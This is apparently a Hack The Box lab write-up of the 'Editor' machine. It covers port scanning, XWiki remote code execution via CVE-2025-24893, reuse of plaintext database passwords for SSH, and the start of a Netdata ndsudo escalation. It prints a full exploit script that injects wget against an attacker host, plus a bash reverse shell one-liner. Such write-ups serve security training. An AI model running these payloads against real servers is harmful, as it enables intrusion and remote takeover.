---
Category: HTB/Machines/Linux
tags:
  - HTB
  - Machine
  - Linux
  - Easy
  - XWiki
  - CVE-2025-24893
  - PlaintextCredentials
  - Netdata
  - CVE-2024-32019
  - ndsudo
---

![](images/Editor.png)

## Table of Contents

- [Summary](#Summary)
- [Reconnaissance](#Reconnaissance)
    - [Port Scanning](#Port-Scanning)
    - [Enumeration of Port 80/TCP](#Enumeration-of-Port-80TCP)
    - [Enumeration o f Port 8080/TCP](#Enumeration-o-f-Port-8080TCP)
    - [Subdomain Enumeration](#Subdomain-Enumeration)
- [Foothold](#Foothold)
    - [CVE-2025-24893: Unauthenticated Remote Code Execution in XWiki via SolrSearch Macro](#CVE-2025-24893-Unauthenticated-Remote-Code-Execution-in-XWiki-via-SolrSearch-Macro)
- [Enumeration (wiki)](#Enumeration-wiki)
- [Privilege Escalation to oliver](#Privilege-Escalation-to-oliver)
- [user.txt](#usertxt)
- [Enumeration (oliver)](#Enumeration-oliver)
- [Enumeration of Port 19999/TCP](#Enumeration-of-Port-19999TCP)
- [Privilege Escalation to root](#Privilege-Escalation-to-root)
    - [CVE-2024-32019: Netdata ndsudo Abuse](#CVE-2024-32019-Netdata-ndsudo-Abuse)
- [root.txt](#roottxt)
- [Post Exploitation](#Post-Exploitation)

## Summary

The box start with the exploitation of an instance of `XWiki` running on port `8080/TCP` by using `CVE-2025-24893` which describes an `Unauthenticated Remote Code Execution (RCE)` via `SolrSearch`. After getting `Foothold` and a shell as the user `xwiki` the next step is to perform a `Privilege Escalation` to the user `Oliver` by using some `plaintext credentials` found inside a `configuration file`. This grants access to the `user.txt`. To `escalate privileges` even further to `root` another `CVE` comes into play which is `CVE-2024-32019`. This `CVE` describes the abuse of the `ndsudo` binary of the `Netdata` suite installed and running on port `19999/TCP`. The binary has the `SUID` bit set, is `owned by root` and allows to execute `whitelisted` binaries in it's `path`. After placing a malicious binary and after adjusting the `$PATH` variable it is possible to get a `shell` as `root`.

## Reconnaissance

### Port Scanning

The initial `port scan` on this box revealed port `22/TCP`, port `80/TCP` and in addition port `8080/TCP` in an open state.

```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- 10.129.231.23 --min-rate 10000
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-02 21:01 CEST
Nmap scan report for 10.129.231.23
Host is up (0.021s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 13.84 seconds
```

A closer look on those ports showed a `redirect` to `editor.htb` which we added to our `/etc/hosts` file. Besides that on port `8080/TCP` was an application hosted called `XWiki`.

```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -p 22,80,8080 10.129.231.23 --min-rate 10000 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-02 21:02 CEST
Nmap scan report for 10.129.231.23
Host is up (0.085s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
8080/tcp open  http    Jetty 10.0.20
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|_  Server Type: Jetty(10.0.20)
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
|_/xwiki/bin/undelete/
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.129.231.23:8080/xwiki/bin/view/Main/
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
|_http-server-header: Jetty(10.0.20)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.26 seconds
```

```shell
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.231.23   editor.htb
```

### Enumeration of Port 80/TCP

The website on port `80/TCP` didn't revealed anything useful. We moved on to port `8080/TCP`.

- [http://editor.htb/](http://editor.htb/)

```shell
┌──(kali㉿kali)-[~]
└─$ whatweb http://editor.htb/
http://editor.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.231.23], Script[module], Title[Editor - SimplistCode Pro], nginx[1.18.0]
```

![](images/2025-08-02_21-05_80_website.png)

### Enumeration o f Port 8080/TCP

When we tested port `8080/TCP` we noticed a few unusual `redirects`.

- [http://editor.htb:8080/](http://editor.htb:8080/)

```shell
┌──(kali㉿kali)-[~]
└─$ whatweb http://editor.htb:8080/
http://editor.htb:8080/ [302 Found] Country[RESERVED][ZZ], HTTPServer[Jetty(10.0.20)], IP[10.129.231.23], Jetty[10.0.20], RedirectLocation[http://editor.htb:8080/xwiki]
http://editor.htb:8080/xwiki [302 Found] Country[RESERVED][ZZ], HTTPServer[Jetty(10.0.20)], IP[10.129.231.23], Jetty[10.0.20], RedirectLocation[http://editor.htb:8080/xwiki/]
http://editor.htb:8080/xwiki/ [302 Found] Country[RESERVED][ZZ], HTTPServer[Jetty(10.0.20)], IP[10.129.231.23], Jetty[10.0.20], RedirectLocation[http://editor.htb:8080/xwiki/bin/view/Main/], UncommonHeaders[content-script-type]
http://editor.htb:8080/xwiki/bin/view/Main/ [200 OK] Content-Language[en], Cookies[JSESSIONID], Country[RESERVED][ZZ], HTML5, HTTPServer[Jetty(10.0.20)], IP[10.129.231.23], probably Index-Of, Jetty[10.0.20], Prototype, Script[application/json,en], Title[XWiki - Main - Intro], UncommonHeaders[content-script-type], XWiki
```

![](images/2025-08-02_21-06_8080_website.png)

Further we found a `login page` but at this point had no credentials and basic tests like `admin:admin` didn't worked here.

- [http://editor.htb:8080/xwiki/bin/loginsubmit/XWiki/XWikiLogin](http://editor.htb:8080/xwiki/bin/loginsubmit/XWiki/XWikiLogin)

![](images/2025-08-02_21-14_8080_login.png)

### Subdomain Enumeration

Without having any credentials and since we got a `domain` to work with, we went for `Subdomain Enumeration` using `ffuf` and found the `Virtual Host` entry of `wiki`.

```shell
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.editor.htb" -u http://editor.htb/ -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://editor.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.editor.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

wiki                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 15ms]
:: Progress: [151265/151265] :: Job [1/1] :: 2061 req/sec :: Duration: [0:00:50] :: Errors: 0 ::
```

We added this one as well to our `/etc/hosts` file in order to access it.

```shell
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.231.23   editor.htb
10.129.231.23   wiki.editor.htb
```

On `wiki.editor.htb` we found another instance of `XWiki` which was kinda odd.

- [http://wiki.editor.htb/xwiki/bin/view/Main/](http://wiki.editor.htb/xwiki/bin/view/Main/)

![](images/2025-08-02_21-07_80_subdomain_website.png)

## Foothold

### CVE-2025-24893: Unauthenticated Remote Code Execution in XWiki via SolrSearch Macro

Now it was time to search for known `vulnerabilities` of `XWiki` which brought us to `CVE-2025-24893` also known as `Unauthenticated Remote Code Execution (RCE)` in `XWiki` via `SolrSearch Macro`.

The exploit on `Exploit-DB` referenced a `Proof of Concept (PoC)` exploit on `GitHub`.

- [https://www.exploit-db.com/exploits/52136](https://www.exploit-db.com/exploits/52136)
- [https://raw.githubusercontent.com/a1baradi/Exploit/refs/heads/main/CVE-2025-24893.py](https://raw.githubusercontent.com/a1baradi/Exploit/refs/heads/main/CVE-2025-24893.py)

The original exploit read the `/etc/passwd` and send the output back to the attacker. We wanted to gain a `reverse shell` which our man `trustie_rity` achieved by modifying one line in the Python script.

```python
exploit_url = f"{target_url}/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22wget%2010.10.16.45/x.sh%20-O%20/tmp/x.sh%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d"
```

```python
┌──(kali㉿kali)-[/media/…/HTB/Machines/Editor/files]
└─$ cat exploit.py 
import requests

# Banner
def display_banner():
    print("="*80)
    print("Exploit Title: CVE-2025-24893 - XWiki Platform Remote Code Execution")
    print("Made By Al Baradi Joy")
    print("="*80)

# Function to detect the target protocol (HTTP or HTTPS)
def detect_protocol(domain):
    https_url = f"https://{domain}"
    http_url = f"http://{domain}"

    try:
        response = requests.get(https_url, timeout=5, allow_redirects=True)
        if response.status_code < 400:
            print(f"[✔] Target supports HTTPS: {https_url}")
            return https_url
    except requests.exceptions.RequestException:
        print("[!] HTTPS not available, falling back to HTTP.")

    try:
        response = requests.get(http_url, timeout=5, allow_redirects=True)
        if response.status_code < 400:
            print(f"[✔] Target supports HTTP: {http_url}")
            return http_url
    except requests.exceptions.RequestException:
        print("[✖] Target is unreachable on both HTTP and HTTPS.")
        exit(1)

# Exploit function
def exploit(target_url):
    target_url = detect_protocol(target_url.replace("http://", "").replace("https://", "").strip())
    exploit_url = f"{target_url}/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22wget%2010.10.16.45/x.sh%20-O%20/tmp/x.sh%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d"


    try:
        print(f"[+] Sending request to: {exploit_url}")
        response = requests.get(exploit_url, timeout=10)

        # Check if the exploit was successful
        if response.status_code == 200 and "root:" in response.text:
            print("[✔] Exploit successful! Output received:")
            print(response.text)
        else:
            print(f"[✖] Exploit failed. Status code: {response.status_code}")

    except requests.exceptions.ConnectionError:
        print("[✖] Connection failed. Target may be down.")
    except requests.exceptions.Timeout:
        print("[✖] Request timed out. Target is slow or unresponsive.")
    except requests.exceptions.RequestException as e:
        print(f"[✖] Unexpected error: {e}")

# Main execution
if __name__ == "__main__":
    display_banner()
    target = input("[?] Enter the target URL (without http/https): ").strip()
    exploit(target)
```

We prepared the file `x` which should get pulled by the exploited application and written to `/tmp/`.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Editor/serve]
└─$ cat x
#!/bin/bash
bash -c '/bin/bash -i >& /dev/tcp/10.10.16.45/9001 0>&1'
```

We executed the exploit and got a hit on our webserver.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Editor/files]
└─$ python3 exploit.py
================================================================================
Exploit Title: CVE-2025-24893 - XWiki Platform Remote Code Execution
Made By Al Baradi Joy
================================================================================
[?] Enter the target URL (without http/https): wiki.editor.htb
[!] HTTPS not available, falling back to HTTP.
[✔] Target supports HTTP: http://wiki.editor.htb
[+] Sending request to: http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22wget%2010.10.16.45/x.sh%20-O%20/tmp/x.sh%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d
[✖] Exploit failed. Status code: 200
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Editor/serve]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.231.23 - - [02/Aug/2025 21:28:32] "GET /x.sh HTTP/1.1" 200 -
10.129.231.23 - - [02/Aug/2025 21:28:32] "GET /x.sh HTTP/1.1" 200 -
```

Now we needed to trigger the written file using a second exploit (simply because we wanted to be quick and not tinker with the PoC to get it in one command).

```python
    exploit_url = f"{target_url}/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22bash%20/tmp/x.sh%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d"
```

```python
┌──(kali㉿kali)-[/media/…/HTB/Machines/Editor/files]
└─$ cat exploit_exec.py 
import requests

# Banner
def display_banner():
    print("="*80)
    print("Exploit Title: CVE-2025-24893 - XWiki Platform Remote Code Execution")
    print("Made By Al Baradi Joy")
    print("="*80)

# Function to detect the target protocol (HTTP or HTTPS)
def detect_protocol(domain):
    https_url = f"https://{domain}"
    http_url = f"http://{domain}"

    try:
        response = requests.get(https_url, timeout=5, allow_redirects=True)
        if response.status_code < 400:
            print(f"[✔] Target supports HTTPS: {https_url}")
            return https_url
    except requests.exceptions.RequestException:
        print("[!] HTTPS not available, falling back to HTTP.")

    try:
        response = requests.get(http_url, timeout=5, allow_redirects=True)
        if response.status_code < 400:
            print(f"[✔] Target supports HTTP: {http_url}")
            return http_url
    except requests.exceptions.RequestException:
        print("[✖] Target is unreachable on both HTTP and HTTPS.")
        exit(1)

# Exploit function
def exploit(target_url):
    target_url = detect_protocol(target_url.replace("http://", "").replace("https://", "").strip())
    exploit_url = f"{target_url}/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22bash%20/tmp/x.sh%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d"

    try:
        print(f"[+] Sending request to: {exploit_url}")
        response = requests.get(exploit_url, timeout=10)

        # Check if the exploit was successful
        if response.status_code == 200 and "root:" in response.text:
            print("[✔] Exploit successful! Output received:")
            print(response.text)
        else:
            print(f"[✖] Exploit failed. Status code: {response.status_code}")

    except requests.exceptions.ConnectionError:
        print("[✖] Connection failed. Target may be down.")
    except requests.exceptions.Timeout:
        print("[✖] Request timed out. Target is slow or unresponsive.")
    except requests.exceptions.RequestException as e:
        print(f"[✖] Unexpected error: {e}")

# Main execution
if __name__ == "__main__":
    display_banner()
    target = input("[?] Enter the target URL (without http/https): ").strip()
    exploit(target)
```

After executing the `second exploit` we got a `callback` on our `listener` as the user `xwiki`.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Editor/files]
└─$ python3 exploit_exec.py 
================================================================================
Exploit Title: CVE-2025-24893 - XWiki Platform Remote Code Execution
Made By Al Baradi Joy
================================================================================
[?] Enter the target URL (without http/https): wiki.editor.htb
[!] HTTPS not available, falling back to HTTP.
[✔] Target supports HTTP: http://wiki.editor.htb
[+] Sending request to: http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22bash%20/tmp/x.sh%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d
[✖] Request timed out. Target is slow or unresponsive.
```

```shell
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.16.45] from (UNKNOWN) [10.129.231.23] 42924
bash: cannot set terminal process group (1125): Inappropriate ioctl for device
bash: no job control in this shell
xwiki@editor:/usr/lib/xwiki-jetty$
```

We `stabilized our shell` real quick to start with the `enumeration`.

```shell
xwiki@editor:/usr/lib/xwiki-jetty$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<tty$ python3 -c 'import pty;pty.spawn("/bin/bash")'
xwiki@editor:/usr/lib/xwiki-jetty$ ^Z
zsh: suspended  nc -lnvp 9001
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ stty raw -echo;fg
[1]  + continued  nc -lnvp 9001

xwiki@editor:/usr/lib/xwiki-jetty$ 
xwiki@editor:/usr/lib/xwiki-jetty$ export XTERM=xterm
xwiki@editor:/usr/lib/xwiki-jetty$
```

## Enumeration (wiki)

The user `xwiki` didn't had any special group memberships or permissions.

```shell
xwiki@editor:/usr/lib/xwiki-jetty$ id
uid=997(xwiki) gid=997(xwiki) groups=997(xwiki)
```

However a look at the `/etc/passwd` showed another available user called `oliver`.

```shell
xwiki@editor:/usr/lib/xwiki-jetty$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
mysql:x:115:121:MySQL Server,,,:/nonexistent:/bin/false
tomcat:x:998:998:Apache Tomcat:/var/lib/tomcat:/usr/sbin/nologin
xwiki:x:997:997:XWiki:/var/lib/xwiki:/usr/sbin/nologin
netdata:x:996:999:netdata:/opt/netdata:/usr/sbin/nologin
oliver:x:1000:1000:,,,:/home/oliver:/bin/bash
_laurel:x:995:995::/var/log/laurel:/bin/false
```

## Privilege Escalation to oliver

To perform a `Privilege Escalation` to `oliver` we expected to find `plaintext credentials` inside a file. Therefore we started searching in the location of the application and found two `passwords` inside `configuration files`.

```shell
xwiki@editor:~$ grep -ri 'password' /etc/xwiki/
/etc/xwiki/hibernate.cfg.xml:    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
/etc/xwiki/hibernate.cfg.xml:    <property 
<--- CUT FOR BREVITY --->
/etc/xwiki/hibernate.cfg.xml.ucf-dist:    <property name="hibernate.connection.password">xwikipassword2025</property>
/etc/xwiki/hibernate.cfg.xml.ucf-dist:    <property 
<--- CUT FOR BREVITY --->
```

| Password          |
| ----------------- |
| theEd1t0rTeam99   |
| xwikipassword2025 |

Switching to `oliver` using `su` didn't worked but one of the passwords worked on `SSH` and therefore we were able to grab the `user.txt` and move on.

```shell
┌──(kali㉿kali)-[~]
└─$ ssh oliver@10.129.231.23
The authenticity of host '10.129.231.23 (10.129.231.23)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:48: [hashed name]
    ~/.ssh/known_hosts:95: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.231.23' (ED25519) to the list of known hosts.
oliver@10.129.231.23's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-151-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Aug  2 07:53:39 PM UTC 2025

  System load:  0.04              Processes:             237
  Usage of /:   64.7% of 7.28GB   Users logged in:       0
  Memory usage: 60%               IPv4 address for eth0: 10.129.231.23
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

4 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

4 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


Last login: Sat Aug 2 19:53:40 2025 from 10.10.16.45
oliver@editor:~$
```

| Username | Password        |
| -------- | --------------- |
| Oliver   | theEd1t0rTeam99 |

## user.txt

```shell
oliver@editor:~$ cat user.txt
07d15a6e37ed7226c2a855940d6a3d02
```

## Enumeration (oliver)

Our newly gained access in form of the user `oliver` was member of the group `netdata`.

```shell
oliver@editor:~$ id
uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)
```

However `oliver` was not able to execute any commands using `sudo`. That indicated access to locations like folders inside `/opt/`.

```shell
oliver@editor:~$ sudo -l
[sudo] password for oliver: 
Sorry, user oliver may not run sudo on editor.
```

But first we followed our standardized procedure and checked the `locally available ports`. There we quite a few `high ports` available but stood out in particular and that was port `19999/TCP`.

```shell
oliver@editor:~$ ss -tulpn
Netid                  State                   Recv-Q                   Send-Q                                          Local Address:Port                                      Peer Address:Port                  Process                  
udp                    UNCONN                  0                        0                                                   127.0.0.1:8125                                           0.0.0.0:*                                              
udp                    UNCONN                  0                        0                                               127.0.0.53%lo:53                                             0.0.0.0:*                                              
udp                    UNCONN                  0                        0                                                     0.0.0.0:68                                             0.0.0.0:*                                              
tcp                    LISTEN                  0                        4096                                                127.0.0.1:19999                                          0.0.0.0:*                                              
tcp                    LISTEN                  0                        4096                                                127.0.0.1:8125                                           0.0.0.0:*                                              
tcp                    LISTEN                  0                        151                                                 127.0.0.1:3306                                           0.0.0.0:*                                              
tcp                    LISTEN                  0                        4096                                            127.0.0.53%lo:53                                             0.0.0.0:*                                              
tcp                    LISTEN                  0                        128                                                   0.0.0.0:22                                             0.0.0.0:*                                              
tcp                    LISTEN                  0                        4096                                                127.0.0.1:43333                                          0.0.0.0:*                                              
tcp                    LISTEN                  0                        511                                                   0.0.0.0:80                                             0.0.0.0:*                                              
tcp                    LISTEN                  0                        70                                                  127.0.0.1:33060                                          0.0.0.0:*                                              
tcp                    LISTEN                  0                        50                                                          *:8080                                                 *:*                                              
tcp                    LISTEN                  0                        50                                         [::ffff:127.0.0.1]:8079                                                 *:*                                              
tcp                    LISTEN                  0                        128                                                      [::]:22                                                [::]:*                                              
tcp                    LISTEN                  0                        511                                                      [::]:80                                                [::]:*
```

## Enumeration of Port 19999/TCP

We forwarded port `19999/TCP` to see what was running on it.

```shell
┌──(kali㉿kali)-[~]
└─$ ssh -L 19999:localhost:19999 oliver@10.129.231.23
oliver@10.129.231.23's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-151-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Aug  2 07:56:16 PM UTC 2025

  System load:  0.12              Processes:             241
  Usage of /:   64.7% of 7.28GB   Users logged in:       0
  Memory usage: 60%               IPv4 address for eth0: 10.129.231.23
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

4 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

4 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Aug 2 19:56:16 2025 from 10.10.16.45
oliver@editor:~$
```

Interestingly enough we found an application called `Netdata` without any authentication.

- [http://localhost:19999/](http://localhost:19999/)

We noticed the version `1.45.2` of `Netdata` and started searching for known vulnerabilities.

```shell
┌──(kali㉿kali)-[~]
└─$ whatweb http://localhost:19999/
http://localhost:19999/ [200 OK] Frame, HTML5, HTTPServer[Netdata Embedded HTTP Server v1.45.2], IP[::1], Script, Title[Netdata Agent Console], UncommonHeaders[access-control-allow-origin,access-control-allow-credentials,x-transaction-id], X-UA-Compatible[IE=edge]
```

| Version |
| ------- |
| 1.45.2  |

![](images/2025-08-02_21-57_19999_website.png)

## Privilege Escalation to root

### CVE-2024-32019: Netdata ndsudo Abuse

After a quick search we found information about `CVE-2024-32019` which described the abuse of a binary called `ndsudo` which is part of the `Netdata` suite.

- [https://www.wiz.io/vulnerability-database/cve/cve-2024-32019](https://www.wiz.io/vulnerability-database/cve/cve-2024-32019)
- [https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93](https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93)
- [https://github.com/netdata/netdata/pull/17377](https://github.com/netdata/netdata/pull/17377)

Along aside other binaries of `Netdata` this one has also the `SUID` bit set on it and allowed the `execution` of `whitelisted binaries` known by the binary itself.

*The vulnerability lies in the `ndsudo` tool, which is packaged as a root-owned executable with the SUID bit set. While the tool is designed to run only a restricted set of external commands, it relies on the `PATH` environment variable for its search paths. This implementation flaw allows an attacker to control where `ndsudo` looks for these commands, potentially directing it to a path where the attacker has write access ([GitHub Advisory](https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93)).*

```shell
oliver@editor:/tmp$ ls -la /opt/netdata/usr/libexec/netdata/plugins.d/
total 81428
drwxr-xr-x 3 root root        4096 Jul  8 08:34 .
drwxr-xr-x 5 root root        4096 Jul  8 08:34 ..
-rwxr-xr-x 1 root root        4873 Apr  1  2024 acl.sh
-rwxr-xr-x 1 root root         154 Apr  1  2024 alarm-email.sh
-rwxr-xr-x 1 root root      137916 Apr  1  2024 alarm-notify.sh
-rwxr-xr-x 1 root root        2155 Apr  1  2024 alarm.sh
-rwxr-xr-x 1 root root         301 Apr  1  2024 alarm-test.sh
-rwxr-xr-x 1 root root        9134 Apr  1  2024 anonymous-statistics.sh
-rwxr-x--- 1 root netdata  1437424 Apr  1  2024 apps.plugin
-rwxr-xr-x 1 root root       23662 Apr  1  2024 cgroup-name.sh
-rwsr-x--- 1 root netdata   965056 Apr  1  2024 cgroup-network
-rwxr-x--- 1 root netdata    10328 Apr  1  2024 cgroup-network-helper.sh
-rwxr-xr-x 1 root root        1259 Apr  1  2024 charts.d.dryrun-helper.sh
-rwxr-x--- 1 root netdata    21948 Apr  1  2024 charts.d.plugin
-rwxr-x--- 1 root netdata   886928 Apr  1  2024 debugfs.plugin
drwxr-xr-x 2 root netdata    20480 Jul  8 08:34 ebpf.d
-rwsr-x--- 1 root netdata  4261672 Apr  1  2024 ebpf.plugin
-rwxr-xr-x 1 root root        1871 Apr  1  2024 ebpf_thread_function.sh
-rwxr-xr-x 1 root root        2139 Apr  1  2024 get-kubernetes-labels.sh
-rwxr-x--- 1 root netdata 70000792 Apr  1  2024 go.d.plugin
-rwxr-xr-x 1 root root        7052 Apr  1  2024 health-cmdapi-test.sh
-rwsr-x--- 1 root netdata    81472 Apr  1  2024 ioping
-rwxr-x--- 1 root netdata     6713 Apr  1  2024 ioping.plugin
-rwsr-x--- 1 root netdata  1144224 Apr  1  2024 local-listeners
-rw-r--r-- 1 root root        6860 Apr  1  2024 loopsleepms.sh.inc
-rwsr-x--- 1 root netdata   200576 Apr  1  2024 ndsudo
-rwsr-x--- 1 root netdata  1377624 Apr  1  2024 network-viewer.plugin
-rwsr-x--- 1 root netdata   896448 Apr  1  2024 nfacct.plugin
-rwxr-x--- 1 root netdata   863608 Apr  1  2024 perf.plugin
-rwxr-x--- 1 root netdata    27998 Apr  1  2024 python.d.plugin
-rwxr-xr-x 1 root root       11020 Apr  1  2024 request.sh
-rwxr-x--- 1 root netdata   860296 Apr  1  2024 slabinfo.plugin
-rwxr-xr-x 1 root root       22444 Apr  1  2024 system-info.sh
